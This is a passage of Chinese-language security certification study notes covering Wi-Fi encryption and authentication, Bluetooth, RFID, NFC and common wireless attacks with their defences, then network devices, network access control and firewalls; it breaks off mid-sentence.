AP，可在本地掌控设备上的所有管理功能。</p><h2 id="11-12-1保护-SSID"><a href="#11-12-1保护-SSID" class="headerlink" title="11.12.1保护 SSID"></a>11.12.1保护 SSID</h2><p>为无线网络分配 SSID 用于区分不同无线网络。</p><p>基础结构模式 SSID 有两种类型：</p><p>扩展服务集标识符（ESSID），是使用 WAP 时无线网络的名称。</p><p>基本服务集标识符（BSSID），是基站的 MAC 地址，用于区分支持 ESSID 的多个基站。</p><p>独立服务集标识符（ISSID），由 Wi-Fi 直连或 ad  hoc  模式使用。</p><p>标准安全实践规定在部署之前应该将默认 SSID  更改为唯一的 SSID。</p><p>WAP 通过信标帧的特殊传输来广播 SSID 。</p><p>信标帧允许其范围内的任何无线 NIC （网络接入卡）看到无线网络并使其连接尽可能简单。</p><p><strong>保护 SSID 安全措施</strong></p><p>1、应该禁用 SSID 的默认广播以保持无线网络的安全（不是真正的安全机制）</p><p>2、使用 WPA2 或 WPA3，可靠的身份认证和加密解决方案</p><h2 id="11-12-2无线信道"><a href="#11-12-2无线信道" class="headerlink" title="11.12.2无线信道"></a>11.12.2无线信道</h2><p>在无线信号的指定频率内对频率的细分称为信道。</p><p>当两个或更多个 2.4 GHz 接入点在物理上相对靠近彼此时，一个信道上的信号可能干扰另一个信道上的信号。规避方式：尽可能区别物理上靠近的接入点的信道，以最小化信道重叠干扰。</p><p>5 GHz 无线设计旨在避免信道重叠和干扰问题，信道间隔更大。2.4 GHz 信道宽 22 MHz，间隔 5MHz，5 GHz 信道宽 20 MHz，间隔 20 MHz。</p><p>相邻的信道可以被组合到更大宽度的信道中以获得更快的吞吐量。</p><p>2.4 GHz 覆盖面积大，速度较慢</p><p>5 GHz 覆盖面积小，速度更快，穿墙能力弱</p><h2 id="11-12-3进行现场调查"><a href="#11-12-3进行现场调查" class="headerlink" title="11.12.3进行现场调查"></a>11.12.3进行现场调查</h2><p>WAP 位置是通过执行现场调查并生成热图来确定的。</p><p>现场调查是指使用射频信号检测器对无线信号强度、质量和干扰进行正式评估。</p><p>现场调查的目标是最大限度地提高所需区域（如家庭或办公室）的性能，同时尽量减少外部区域未经授权的访问。</p><h2 id="11-12-4-无线安全"><a href="#11-12-4-无线安全" class="headerlink" title="11.12.4 无线安全"></a>11.12.4 无线安全</h2><p><strong>开放系统身份认证OSA</strong></p><p>开放系统身份认证（Open System Authentication），以明文形式传输所有内容，不提供保密性和安全性。</p><p><strong>共享密钥身份认证SKA</strong></p><p>共享密钥身份认证（Share Key Authentication），必须在网络通信发生前进行某种形式的身份认证，802.11 标准为 SKA 定义有线等效保密的可选技术。</p><h3 id="WEP"><a href="#WEP" class="headerlink" title="WEP"></a>WEP</h3><p>有线等效保密（Wired Equivalent Privacy）</p><p>使用预定义的共享 Rivest Cipher 4（RC4）密钥进行身份认证（即SKA）和加密。</p><p>共享密钥是静态的，且在 WAP 和客户端之间共享。</p><p>由于 RC 4 的实施存在缺陷，WEP 很弱。</p><h3 id="WPA"><a href="#WPA" class="headerlink" title="WPA"></a>WPA</h3><p>Wi-Fi 受保护访问（Wi-Fi Protected Access，WPA）是 WEP 的替代品。</p><p>WPA 不再使用相同的静态密钥来加密所有通信，与每个主机协商一个唯一的密钥集，将认证和加密分离。</p><p>WPA 使用 RC4 算法，并采用临时密钥完整协议（TKIP）或 Cisco替代品-轻量级可扩展身份认证协议（LEAP）</p><p>针对 WPA 的攻击（即 coWPAtty 和基于 GPU 的破解攻击）使得 WPA 不再安全。</p><h3 id="WPA2"><a href="#WPA2" class="headerlink" title="WPA2"></a>WPA2</h3><p>IEEE 802.11i 或Wi-Fi受保护访问2（Wi-Fi Protected Access 2，WPA2）取代了 WEP 和 WPA 。</p><p>使用 AES-CCMP 加密，而不是 RC4。</p><p><strong>IEEE 802.11i &#x2F; WPA2 身份认证选项</strong></p><p>1、预共享密钥（PSK）或个人（PER）模式</p><p>PSK 使用静态固定密码进行身份认证。</p><p>2、IEEE 802.1X 或企业（ENT）模式</p><p>ENT 支持使用现有 AAA 服务（如 RADIUS - UDP 1812 端口或 TACACS+ - TCP 49 端口）进行身份认证。</p><h3 id="WPA3"><a href="#WPA3" class="headerlink" title="WPA3"></a>WPA3</h3><p>WPA3-ENT 使用 192 位 AES CCMP 加密</p><p>WPA3-PSK 使用 128 位 AES CCMP 加密，将预共享密钥身份认证替换为对等同步身份认证。</p><p>对等同步身份认证（Simultaneous Authentication of Equals，SAE）使用蜻蜓密钥交换（Dragonfly Key Exchange）的零知识证明过程， 该过程是 Diffie-Hellman 的衍生物。该过程使用预设密码以及客户端和 AP 的 MAC 地址来执行身份认证和会话密钥交换。</p><p>WPA3 还实现了 IEEE 802.11w-2009 管理帧保护，因此大多数网络管理操作都具有保密性、完整性、源身份认证和重播保护。</p><h3 id="802-1X-EAP"><a href="#802-1X-EAP" class="headerlink" title="802.1X&#x2F;EAP"></a>802.1X&#x2F;EAP</h3><p>WAP、WAP2 和 WAP3 都支持 802.1X&#x2F;EAP 的企业（ENT）身份认证，是一种基于端口的标准网络访问控制，可确保客户端在进行正确身份之前无法与资源通信。</p><p>802.1X 是一种切换系统，允许无线网络利用现有网络基础设施的身份认证服务。</p><p>使用 802.1X ，可以将其他技术和解决方案（如RADIUS、TACACS、证书、智能卡、令牌设备和生物识别技术）集成到无线网络中以提供相互身份认证和多因素身份认证。</p><p>可扩展身份认证协议（EAP）是一个身份认证框架，允许新的身份认证技术与现有的无线或点对点连接技术兼容。</p><h3 id="LEAP"><a href="#LEAP" class="headerlink" title="LEAP"></a>LEAP</h3><p>轻量级可扩展身份认证协议（Lightweight Extensible Authentication Protocol，LEAP）是针对 WPA 的 TKIP 的 Cisco 专有替代方案。</p><h4 id="LEAP-安全风险"><a href="#LEAP-安全风险" class="headerlink" title="LEAP 安全风险"></a>LEAP 安全风险</h4><p>尽可能避免使用 LEAP</p><p>建议使用 EAP-TLS</p><p>使用 LEAP ，则必须使用强密码</p><h3 id="PEAP"><a href="#PEAP" class="headerlink" title="PEAP"></a>PEAP</h3><p>受保护的可扩展身份认证协议（Protected Extensible Authentication Protocol）将 EAP 方法封装在提供身份认证和可能加密的 TLS 隧道中。</p><p>EAP 通常不加密。 PEAP 可为 EAP 方法提供加密。</p><h2 id="11-12-5Wi-Fi保护设置"><a href="#11-12-5Wi-Fi保护设置" class="headerlink" title="11.12.5Wi-Fi保护设置"></a>11.12.5Wi-Fi保护设置</h2><p>Wi-Fi 保护设置（Wi-Fi Protected Setup，WPS）是无线网络的安全标准。</p><p>旨在减少将新客户端添加到无线网络的工作量。</p><p>WPS 可通过 WAP 上的按钮或可远程发送到基站的代码或 PIN 启动，存在暴力猜测攻击风险，黑客能在 6 小时内猜测到 WPS 代码（PIN 码由两个四位数段组成，可以一次猜测一个段）</p><p>WPS 是大多数 WAP 默认启用的功能，因为是设备 Wi-Fi 联盟认证的必要条件</p><p>安全加固建议：</p><p>1、禁用 WPS</p><p>2、无法禁用 WPS 的话，升级基站固件版本或更换整个基站</p><h2 id="11-12-6无线-MAC-过滤器"><a href="#11-12-6无线-MAC-过滤器" class="headerlink" title="11.12.6无线 MAC 过滤器"></a>11.12.6无线 MAC 过滤器</h2><p>MAC 过滤器可被用在 WAP 上以限制对已知或经过批准的访问。</p><p>通过 MAC 地址进行限制，难以管理，仅限于小型静态环境使用。</p><p>安全风险：</p><p>即使使用 WPA2 或 WPA3 ，以太网报头仍然以明文形式存在，存在被嗅探和欺骗授权的 MAC 地址。</p><h2 id="11-12-7天线无线管理"><a href="#11-12-7天线无线管理" class="headerlink" title="11.12.7天线无线管理"></a>11.12.7天线无线管理</h2><p>各种天线类型可用于无线客户端和基站。</p><p>标准天线或极天线是全向天线，也被称为基础天线或橡胶鸭天线。</p><p>大多数其他类型的天线是定向的，包括八木天线、卡特纳天线、平板天线和抛物线天线。</p><p>寻求最佳天线位置时，需要考虑的准则：</p><ul><li>使用中心位置</li><li>避免固体物理障碍</li><li>避免反光或其他扁平金属表面</li><li>避免电气设备</li></ul><p><strong>无线信号会受到干扰、距离和障碍物的影响。</strong></p><h2 id="11-12-8使用强制门户"><a href="#11-12-8使用强制门户" class="headerlink" title="11.12.8使用强制门户"></a>11.12.8使用强制门户</h2><p>强制门户是一种身份认证技术，可将新连接的客户端重定向到基于 Web 的门户网站访问控制页面。</p><p>强制门户用于要求用户提供登录凭证或输入访问代码，也用于向用户显示可接受的使用策略、隐私策略和跟踪策略。</p><h2 id="11-12-9一般Wi-Fi安全程序"><a href="#11-12-9一般Wi-Fi安全程序" class="headerlink" title="11.12.9一般Wi-Fi安全程序"></a>11.12.9一般Wi-Fi安全程序</h2><p>部署Wi-Fi网络需要遵守的指南或步骤</p><p>1、更新固件</p><p>2、将默认管理员密码更改为独特复杂的密码</p><p>3、启用 WPA2 或 WPA3 加密</p><p>4、用长而复杂的密码启用 ENT 身份认证或 PSK&#x2F;SAE</p><p>5、更改默认 SSID（默认 SSID通常为供应商名称）</p><p>6、更改无线 MAC 地址（以隐藏默认 MAC 地址的 OUI 和设备品牌&#x2F;型号编码）</p><p>7、根据部署要求评估是否禁用 SSID 广播（即使这样不会增加安全性）</p><p>8、如果无线客户端数量很少（小于 20 个），启动 MAC 地址过滤并使用静态地址</p><p>9、考虑使用静态地址，或使用预留设置 配置 DHCP（仅适用于小型环境部署）</p><p>10、将无线视为外部或远程访问，并使用防火墙将 WAP 和有线网络分隔</p><p>11、将无线视为攻击者的入口，并使用 NIDS 监控所有 WAP 到有线网络的通信</p><p>12、部署无线入侵检测系统（WIDS）和无线入侵防御系统（WIPS）</p><p>13、考虑在 Wi-Fi 链路上使用 VPN </p><p>14、部署强制门户</p><p>15、跟踪和记录所有无线活动和事件</p><h2 id="11-12-10无线通信"><a href="#11-12-10无线通信" class="headerlink" title="11.12.10无线通信"></a>11.12.10无线通信</h2><p>无线通信是一个快速扩展的网络、连接、通信和数据交换技术领域。</p><h3 id="通用无线概念"><a href="#通用无线概念" class="headerlink" title="通用无线概念"></a>通用无线概念</h3><p>无线通信使用无线电波在一定距离上传输信号。</p><p>无线电频谱使用频率区分。</p><p>频率是特定时间内波振荡次数的测量值，使用单位赫兹（Hz）或每秒振荡来表示。</p><h4 id="频谱使用技术"><a href="#频谱使用技术" class="headerlink" title="频谱使用技术"></a>频谱使用技术</h4><h5 id="扩频（Spread-Spectrum）"><a href="#扩频（Spread-Spectrum）" class="headerlink" title="扩频（Spread Spectrum）"></a>扩频（Spread Spectrum）</h5><p>通信在多个频率上发生，消息被分成几部分，并且每个部分同时发送但使用不同的频率，是<strong>并行通信</strong>。</p><h5 id="跳频扩频FHSS"><a href="#跳频扩频FHSS" class="headerlink" title="跳频扩频FHSS"></a>跳频扩频FHSS</h5><p>跳频扩频（Frequency Hopping Spread Spectrum，FHSS）是扩频概念的早期实现，在一个频率范围内串行传输数据，但一次只使用一个频率。</p><h5 id="直接序列扩频DSSS"><a href="#直接序列扩频DSSS" class="headerlink" title="直接序列扩频DSSS"></a>直接序列扩频DSSS</h5><p>直接序列扩频（Direct Sequence Spread Spectrum，DSSS）<strong>同时并行使用频率</strong>。</p><p>使用码片编码的特殊编码机制，即使信号的某些部分因干扰而失真，也允许接收机重建数据。</p><h5 id="正交频分复用OFDM"><a href="#正交频分复用OFDM" class="headerlink" title="正交频分复用OFDM"></a>正交频分复用OFDM</h5><p>正交频分复用（Orthogonal Frequency- Division Multiplexing，OFDM）采用数字多载波调制方案，允许更紧凑的传输。</p><p>调制信号是垂直的（正交的），不会相互干扰。</p><p>OFDM 需要更小的频率集（即信道频带），可以提供更大的数据吞吐量。</p><h3 id="蓝牙（802-15）"><a href="#蓝牙（802-15）" class="headerlink" title="蓝牙（802.15）"></a>蓝牙（802.15）</h3><p>IEEE 802.15 中定义，使用 2.4 GHz 频率。</p><p>默认传输纯文本，可以使用专用发射机和外围设备对其进行加密。</p><p>蓝牙在已经配对的设备之间运行，通常使用默认的配对代码，如0000或1234。</p><p>蓝牙是一种短距离通信方法（用于创建个人局域网络，距离取决于配对设备天线的相对强度。</p><p>蓝牙的标准或官方使用范围可以达到 100 米。</p><h4 id="蓝牙常见攻击"><a href="#蓝牙常见攻击" class="headerlink" title="蓝牙常见攻击"></a>蓝牙常见攻击</h4><p>所有蓝牙设备都容易受到的攻击</p><ul><li>蓝牙嗅探（bluesniffing）是以蓝牙为中心的网络数据包捕获</li><li>蓝牙攻击（bluesmacking）是针对蓝牙设备的 DoS 攻击，可以通过传输垃圾流量或干扰信号来实现</li><li>蓝牙劫持（bluejacking）涉及在所未经所有者&#x2F;用户许可的情况下向支持蓝牙功能的设备发送未经请求的消息。</li></ul><p>少数设备容易受到的攻击</p><ul><li><p>蓝牙侵吞（bluesnarfing）是通过蓝牙连接对数据进行未授权的访问。</p><p>通常发生在黑客系统和目标设备之间的成对链路上。</p></li><li><p>蓝牙窃听（bluebugging）允许攻击者通过蓝牙连接远程控制设备的硬件和软件</p></li></ul><h4 id="蓝牙防御措施"><a href="#蓝牙防御措施" class="headerlink" title="蓝牙防御措施"></a>蓝牙防御措施</h4><p>尽量减少蓝牙的使用，如果不使用应将蓝牙完全关闭。</p><h3 id="RFID"><a href="#RFID" class="headerlink" title="RFID"></a>RFID</h3><p>射频识别（Radio Frequency Identification，RFID）是一种用放置在磁场中的天线产生的电流为无线发射机供电的跟踪技术。</p><p>RFID 可以从相当远的距离（可能数百米）触发&#x2F;供电和读取。</p><p>不必直接接近物理设备，只要携带 RFID 读取器，黑客就可以收集该区域内芯片传输的信息。</p><p>当 RFID 芯片靠近读取器时会被唤醒并响应，芯片（也称为 RFID 标签）发送唯一的代码或序列号，需要将序列号和特定对象关联，如果无法准确关联，该序列号是没有意义的。</p><h3 id="NFC"><a href="#NFC" class="headerlink" title="NFC"></a>NFC</h3><p>近场通信（near-field communication，NFC）是在非常接近的设备之间建立无线电通信的标准（如无源 RFID 的几英寸与英尺）。</p><p>允许通过使用设备相互接触或将它们放在彼此相距几厘米的范围内来执行设备之间的自动同步和关联。</p><p>NFC 是 RFID 的衍生技术，本身就是一种现场供电或手动触发设备。</p><p>NFC 芯片可以支持挑战-响应对话，可以使用公钥基础设施（PKI）加密解决方案。</p><h4 id="NFC-安全风险"><a href="#NFC-安全风险" class="headerlink" title="NFC 安全风险"></a>NFC 安全风险</h4><p>路径攻击</p><p>窃听</p><p>数据操纵</p><p>重放攻击</p><h4 id="NFC-安全措施"><a href="#NFC-安全措施" class="headerlink" title="NFC 安全措施"></a>NFC 安全措施</h4><p>在需要使用 NFC 功能之前将其禁用</p><h2 id="11-12-11无线攻击"><a href="#11-12-11无线攻击" class="headerlink" title="11.12.11无线攻击"></a>11.12.11无线攻击</h2><h3 id="Wi-Fi扫描器"><a href="#Wi-Fi扫描器" class="headerlink" title="Wi-Fi扫描器"></a>Wi-Fi扫描器</h3><p>战争驾驶（war driving）是某些人使用检测工具寻找无线网络信号的行为。</p><p>使用操作系统的本机功能或使用专门的扫描和检测工具（即无线扫描仪）来执行。</p><p>无线扫描仪用于检测无线网络的存在。由于基站将发射无线电波，即使是禁用 SSID 广播的基站，也可以检测到任何未封装在法拉第笼中的活动的无线网络。</p><p>无线扫描仪能确定该区域是否存在无线网络、使用的频率和信道、SSID以及使用的加密类型（如果有）。</p><p>无线破解可以用来破解 WEP 和 WPA 网络的加密。</p><h3 id="恶意接入点"><a href="#恶意接入点" class="headerlink" title="恶意接入点"></a>恶意接入点</h3><p>流氓 WAP 由员工或物理入侵者在内部安装、或由攻击者在外部操作。</p><p><strong>攻击手段</strong></p><p>1、针对现有的无线客户端或未来访问的无线客户端</p><p>复制有效 WAP 的 SSID、MAC地址和无线信道，以更高的额定功率运行，导致保存无线配置的客户无意中选择或更倾向于连接到流氓 WAP</p><p>2、侧重于吸引新的访问无线客户端。</p><p>通过将 SSID 设置为看起来和原始有效 SSID 一样合法的备用名称，不需要克隆原始 WAP 和 MAC 地址的信道</p><p><strong>防御手段</strong></p><p>1、通过 WIDS 监视无线信号滥用。</p><p>2、客户端连接无线链路时使用 VPN，成功建立 VPN 连接时，才应使用无线链路。</p><h3 id="Evil-Twin"><a href="#Evil-Twin" class="headerlink" title="Evil Twin"></a>Evil Twin</h3><p>黑客操作虚假接入点，将根据客户端设备的连接情况自动克隆或孪生接入点身份。</p><p><strong>原理</strong></p><p>客户端成功连接无线网络时，会保留无线网络配置文件，当设备处于相关基站范围内时，可以用已经保存的配置向对应的网络重发连接请求。</p><p>一旦 Evil Twin 看到重新连接请求，会用这些参数伪造身份，并提供和客户端的明文连接。客户端与虚假 Evil Twin 基站建立连接后，黑客能通过路径攻击窃听通信，可能导致会话劫持、数据操作凭证被盗和身份盗用。</p><p><strong>防御方式</strong></p><p>1、关注设备连接的无线网络</p><p>2、从历史记录列表中删除不必要的旧无线配置文件</p><p>3、检查当前是否正在使用通信安全（加密）</p><p>4、使用无线连接时尝试连接 VPN</p><h3 id="解除关联"><a href="#解除关联" class="headerlink" title="解除关联"></a>解除关联</h3><p>解除关联（disassociation）</p><p>当客户端连接到同一 ESSID网络覆盖区域中的另一个 WAP 时，解除关联帧用于断开客户端与一个 WAP 的连接。</p><p><strong>管理帧用于的无线攻击</strong></p><ul><li>对于具有隐藏 SSID 的网络，将 MAC 地址伪造为 WAP 地址的解除关联数据包并将其发送到连接的客户端，导致客户端失去连接，然后发送重新关联请求数据包（尝试重新建立连接），其中包括已清除的 SSID。</li><li>攻击可以向客户端发送重复的解除关联帧以防止重新关联，从而导致拒绝服务。</li><li>会话劫持事件可以通过使用 解除关联帧 来启动，让客户端保持断开连接的状态，攻击者模拟客户端通过 WAP 接管客户端无线会话。</li><li>通过使用解除关联帧断开客户端连接，可以实现路径攻击。</li></ul><p><strong>防御攻击方案</strong></p><p>运行 WIDS 以监控无线滥用。</p><h3 id="阻塞"><a href="#阻塞" class="headerlink" title="阻塞"></a>阻塞</h3><p>阻塞（jamming）是指通过降低有效信噪比来故意阻止或干扰通信的无线电信号传输。</p><p><strong>解决方案</strong></p><p>1、调整设备的物理位置</p><p>2、检查是否有使用相同频率或信道的设备</p><p>3、如果存在冲突，更改可控制设备上使用的频率和频道</p><p>4、如果发生干扰攻击，尝试对攻击源进行三角定位</p><h3 id="初始化向量滥用"><a href="#初始化向量滥用" class="headerlink" title="初始化向量滥用"></a>初始化向量滥用</h3><p>初始化向量（initialization vector，IV）是随机数的数学和加密术语。</p><p>加密功能使用 IV 来降低可预测性和可重复性，提高安全性。</p><p><strong>IV 风险点</strong></p><p>IV 过短，以明文交换或选择不当时，IV 会成为弱点。</p><h3 id="重放"><a href="#重放" class="headerlink" title="重放"></a>重放</h3><p>重放攻击（replay attack）是指重传捕获的通信，以获得对目标系统的访问。</p><p><strong>重放防御方案</strong></p><p>1、保持基站的固件更新</p><p>2、使用 WIDS 检测滥用</p><p>3、使用一次性身份认证机制，消息包含时间戳和过期期限，使用基于挑战-响应的身份认证以及使用顺序会话标识</p><h1 id="11-13其他通信协议"><a href="#11-13其他通信协议" class="headerlink" title="11.13其他通信协议"></a>11.13其他通信协议</h1><h2 id="LiFi"><a href="#LiFi" class="headerlink" title="LiFi"></a>LiFi</h2><p>LiFi（Light Fidelity）是一种利用光进行无线通信的技术。</p><p>使用可见光、红外线和紫外线光谱来支持数字传输。</p><p>理论传输速率为 100 Gbps。</p><p><strong>缺陷</strong></p><p>1、范围更小，相对于无线电信号</p><p>2、解决方案比 Wi-Fi 更加昂贵</p><h2 id="卫星通信"><a href="#卫星通信" class="headerlink" title="卫星通信"></a>卫星通信</h2><p>卫星通信（satellite communications）主要基于地面位置和在轨人造卫星之间的无线电波传输。</p><p>卫星用于支持电话、电视、广播、互联网和军事通信。</p><p><strong>卫星定位轨道</strong></p><p>1、近地轨道（LEO）</p><p>160-2000千米</p><p>信号更强</p><p>2、中地轨道（MEO）</p><p>2000-35 786千米</p><p>在相同地面位置上空的时间要比近地轨道卫星长，具有更大的传输面积（其发射器&#x2F;接收器覆盖的地球面积）</p><p>轨道高，存在额外的延迟和较弱的信号</p><p>3、地球同步轨道（GEO）</p><p>35 786千米</p><p>以与地球自转相同的角速度围绕地球旋转，地球同步轨道卫星在地面位置上方保持固定位置，卫星的传输面积比中地轨道卫星更大。</p><p>可以使用固定天线。</p><h2 id="窄带无线通信"><a href="#窄带无线通信" class="headerlink" title="窄带无线通信"></a>窄带无线通信</h2><p>窄带无线通信（narrow-band wireless）用于在电缆或传统无线无效或不适合的距离或地理空间进行通信。</p><p>需要监控和加密窄带无线通信。</p><h2 id="Zigbee"><a href="#Zigbee" class="headerlink" title="Zigbee"></a>Zigbee</h2><p>基于蓝牙的物联网设备通信概念。</p><p>具有低功耗和低吞吐率</p><p>需要接近设备</p><p>通信使用 128 位对称算法加密</p><h1 id="11-14蜂窝网络"><a href="#11-14蜂窝网络" class="headerlink" title="11.14蜂窝网络"></a>11.14蜂窝网络</h1><p>蜂窝网络（cellular network）或无线网络是许多移动设备（特别是蜂窝电话和智能手机）使用的主要通信技术。</p><p>蜂窝通信服务通常是加密的，但仅限于从移动设备传输到传输塔时。一旦通过电线传输，通信实际上就是明文。<strong>避免在蜂窝网络上执行任何性质敏感或机密任务</strong>。使用加密通信应用程序（如 TLS 或 VPN）对通信进行预加密。</p><p><strong>关键问题</strong></p><p>1、通过手机提供商的网络进行的通信，无论是语音、文本还是数据，都不一定是安全的。</p><p>2、如果使用特定的无线嗅探设备，手机传输的数据可能会被截获。</p><p>可以通过模拟供应商的基站（伪基站），进行中间人&#x2F;路径攻击。</p><p>3、使用手机访问互联网或办公网的行为存在为攻击者提供潜在的攻击、访问和破坏途径。手机设备成为攻击跳板。</p><h1 id="11-15内容分发网络"><a href="#11-15内容分发网络" class="headerlink" title="11.15内容分发网络"></a>11.15内容分发网络</h1><p>内容分发网络（content distribution network，CDN）或内容传递网络是在互联网上的多个数据中心部署的资源服务的集合。</p><p>提供托管内容的低延迟、高性能和高可用性。</p><p>将媒体内容存储在地理位置更靠近用户的存储平台。</p><p>基于客户端的 CDN 被称为 P2P（点对点，peer-to-peer），例如 BitTorrent。</p><h1 id="11-16安全网络组件"><a href="#11-16安全网络组件" class="headerlink" title="11.16安全网络组件"></a>11.16安全网络组件</h1><h2 id="11-16-1硬件的安全操作"><a href="#11-16-1硬件的安全操作" class="headerlink" title="11.16.1硬件的安全操作"></a>11.16.1硬件的安全操作</h2><h3 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h3><p>避免单点故障的 IT 基础设施，为可用性提供强大支持。</p><h3 id="考虑的问题"><a href="#考虑的问题" class="headerlink" title="考虑的问题"></a>考虑的问题</h3><p>1、可靠的电源</p><p>2、保修或退货政策</p><p>3、技术支持</p><h2 id="11-16-2常用网络设备"><a href="#11-16-2常用网络设备" class="headerlink" title="11.16.2常用网络设备"></a>11.16.2常用网络设备</h2><h3 id="中继器、集中器和放大器"><a href="#中继器、集中器和放大器" class="headerlink" title="中继器、集中器和放大器"></a>中继器、集中器和放大器</h3><p>用于加强电缆通信信号以及连接使用相同协议的网段。</p><p>放大器 RCA 在 OSI 第 1 层运行，两侧的系统是同一冲突域和广播域的一部分。</p><h3 id="集线器"><a href="#集线器" class="headerlink" title="集线器"></a>集线器</h3><p>用于连接多个系统以及连接使用相同协议的网段。</p><p>集线器是多端口中继器。</p><p>集线器在 OSI 第 1 层运行，集线器两侧的系统是同一冲突域和广播域的一部分。</p><h3 id="调制解调器"><a href="#调制解调器" class="headerlink" title="调制解调器"></a>调制解调器</h3><p>传统的 landline 调制解调器是一种通信设备，覆盖或调制模拟载波信号和数字信号。</p><p>调制解调器通常被数字宽带技术所取代，包括电缆调制解调器、DSL 调制解调器，802.11 无线以及各种形式的 无线调制解调器。</p><h3 id="网桥"><a href="#网桥" class="headerlink" title="网桥"></a>网桥</h3><p>用于将两个网络（甚至是不同拓扑结构、布线类型和速率的网络）连接在一起，以便连接使用相同协议的网段。</p><p>存储转发设备，不同传输速度连接网络的网桥之间用缓冲区来存储数据包。</p><p>网络在 OSI 第 2 层运行，主要用于将集线器网络连接在一起。</p><h3 id="交换机"><a href="#交换机" class="headerlink" title="交换机"></a>交换机</h3><p>通过 MAC 地址管理帧的传输。</p><p>交换机主要在 OSI 第 2 层运行。</p><p>如果交换机存在其他路由功能，也可以在 OSI 第 3 层运行。</p><h3 id="路由器"><a href="#路由器" class="headerlink" title="路由器"></a>路由器</h3><p>用于控制网络上的流量，通常用于连接类似的网络并控制两者之间的流量。</p><p>路由器根据逻辑 IP 地址管理流量。</p><p>可以使用静态定义的路由表运行，也可以使用动态路由系统。</p><p>路由器在 OSI 第 3 层运行。</p><h3 id="LAN-扩展器"><a href="#LAN-扩展器" class="headerlink" title="LAN 扩展器"></a>LAN 扩展器</h3><p>一种远程访问的多层交换机，用于在广域网链路上连接远程网络，也被称为广域网交换机或广域网路由器。</p><h3 id="跳转箱"><a href="#跳转箱" class="headerlink" title="跳转箱"></a>跳转箱</h3><p>跳转服务器或跳转箱（jumpbox）是一种远程访问系统，用于使对特定系统或网络的访问更容易或更安全。</p><p>无论使用何种形式的连接来访问跳转服务器，都必须确保只使用加密连接。</p><h3 id="传感器"><a href="#传感器" class="headerlink" title="传感器"></a>传感器</h3><p>传感器收集信息，然后将其传输回中央系统以进行存储和分析。</p><p>许多传感器都基于 SoC</p><p>SoC 是一种集成电路（IC）或者芯片，将计算机的所有元件集成到单个芯片中。</p><p>SoC 安全风险：</p><p>固件或操作系统最小，所以其中安全功能空间很少。</p><p>SoC 安全功能：</p><ul><li>过滤输入（如按长度或转义元字符）</li><li>拒绝未签名代码</li><li>提供基本防火墙过滤</li><li>使用加密通信</li><li>提供安全身份认证</li></ul><h3 id="采集器"><a href="#采集器" class="headerlink" title="采集器"></a>采集器</h3><p>安全采集器将数据收集到日志或记录文件中的系统。</p><p>采集器监控特定的活动、事件或流量，将信息记录在文件中。</p><h3 id="聚合器"><a href="#聚合器" class="headerlink" title="聚合器"></a>聚合器</h3><p>一种多路复用器。</p><p>大量输入被接收、定向或传输到单个目的地。</p><p>MPLS 是聚合器的示例。</p><h2 id="11-16-3网络访问控制"><a href="#11-16-3网络访问控制" class="headerlink" title="11.16.3网络访问控制"></a>11.16.3网络访问控制</h2><p>网络访问控制（network  access  control，NAC）通过严格遵守和执行安全策略来控制对环境的访问。</p><p>NAC 是一个自动检测和响应系统，可实时做出反应，以确保所有受监控系统的补丁和更新是最新的，并符合最新的安全配置，同时防止未经授权的设备进入网络。</p><h3 id="NAC-的目标"><a href="#NAC-的目标" class="headerlink" title="NAC 的目标"></a>NAC 的目标</h3><p>目标可通过使用强大的详细安全策略来实现。</p><ul><li>防止&#x2F;减少已知的直接攻击和间接的零日攻击</li><li>在整个网络中实施安全策略</li><li>使用标识执行访问控制</li></ul><h3 id="NAC-实现"><a href="#NAC-实现" class="headerlink" title="NAC 实现"></a>NAC 实现</h3><p>接入前、接入后、接入前和接入后</p><ul><li>接入前控制原则要求系统在允许与网络通信之前满足所有当前的安全要求（例如：补丁应用程序和恶意软件扫描器更新）</li><li>接入后控制原则允许和拒绝基于用户活动的访问，该用户活动基于预定义的授权矩阵。</li></ul><h3 id="NAC-选项"><a href="#NAC-选项" class="headerlink" title="NAC 选项"></a>NAC 选项</h3><h4 id="使用主机-系统代理（基于代理）"><a href="#使用主机-系统代理（基于代理）" class="headerlink" title="使用主机&#x2F;系统代理（基于代理）"></a>使用主机&#x2F;系统代理（基于代理）</h4><p>1、受管控系统上安装 NAC 监控代理</p><p>2、定期检查配置文件，校验是否符合要求</p><p>3、如果不符合要求，则迁移系统到修正子网中，在子网中只能和 NAC 服务器通信</p><p>4、修正子网中更新调整配置文件，符合要求后，系统将返回正常生产网络</p><h5 id="可消除-NAC-代理"><a href="#可消除-NAC-代理" class="headerlink" title="可消除 NAC 代理"></a>可消除 NAC 代理</h5><p>设置为运行一次，然后终止</p><h5 id="永久-NAC-代理"><a href="#永久-NAC-代理" class="headerlink" title="永久 NAC  代理"></a>永久 NAC  代理</h5><p>设置为永久后台服务软件被安装在受监控的系统上。</p><h4 id="执行总体网络监控和评估（无代理）"><a href="#执行总体网络监控和评估（无代理）" class="headerlink" title="执行总体网络监控和评估（无代理）"></a>执行总体网络监控和评估（无代理）</h4><p>从 NAC 服务器对网络系统进行端口扫描、服务查询和漏洞扫描，以确定设备是否经过授权且符合基线。</p><p>需要管理员手动解决发现的任何问题。</p><h3 id="NAC-问题"><a href="#NAC-问题" class="headerlink" title="NAC 问题"></a>NAC 问题</h3><p>带外与带内检测以及解决补救、隔离或强制门户策略。</p><h2 id="11-16-4防火墙"><a href="#11-16-4防火墙" class="headerlink" title="11.16.4防火墙"></a>11.16.4防火墙</h2><p>防火墙是管理、控制和过滤网络流量的重要工具。</p><p>防火墙一般部署在不同安全级别或不同信任度之间。</p><p>硬件防火墙也被称为设备防火墙、网络防火墙。</p><p>防火墙根据定义的一组规则（也被称为过滤器或访问控制列表）过滤流量。</p><p>典型的防火墙都基于默认拒绝或隐式拒绝的安全立场，只有满足显式允许例外才可以通行。</p><p>筛选器规则的操作通常为允许、拒绝和记录。</p><p>防火墙对未请求和从专用网络外部启动的通信量最有效，并可用于阻塞基于内容、应用程序、协议、端口或源地址的已知恶意数据、消息或数据包。</p><p>大多数防火墙提供广泛的日志记录、审计和监视功能，以及警报和基本入侵检测系统（IDS）功能。</p><p>常见的入口过滤器和出口过滤器可用于阻止通常与恶意软件、僵尸网络和其他不需要的活动有关的伪造数据包，例如：</p><ul><li>阻止声称具有内部源地址的入站数据包</li><li>阻止声称具有外部源地址的出站数据包</li><li>阻止源地址或目的地址被列在阻止列表（已知恶意IP地址列表）上的数据包</li><li>阻止具有来自局域网（LAN）的源地址或目标地址但尚未正式分配给主机的数据包。</li></ul><p>防火